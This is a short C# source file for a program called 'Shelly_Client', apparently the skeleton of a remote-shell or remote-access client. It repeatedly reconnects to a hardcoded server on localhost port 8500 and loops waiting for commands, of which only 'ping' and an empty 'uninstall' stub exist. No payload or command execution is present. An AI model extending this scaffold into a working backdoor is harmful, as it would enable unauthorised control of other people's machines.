using System;
using System.Threading;

namespace Shelly_Client
{
    class Program
    {
        public const string ServerIp = "127.0.0.1";
        public const int ServerPort = 8500;

        static void Main(string[] args)
        {
            TryToConnect:

            // Try to connect
            try
            {
                SocketHandler.Connect();
            } catch
            {
                // Wait, try again
                Thread.Sleep(5000);
                goto TryToConnect;
            }
            
            // Infinite loop
            while (true)
            {
                // Try to read data
                try
                {
                    // Read data
                    switch (SocketHandler.Receive())
                    {
                        // Uninstall shell
                        case "uninstall":
                            // Uninstall method here
                            break;
                        
                        // Send ping to server
                        case "ping":
                            SocketHandler.Send(Functions.ping());
                            break;
                    }
                } catch
                {
                    // Disconnect
                    SocketHandler.Disconnect();
                    goto TryToConnect;
                }
            }
        }
    }
}
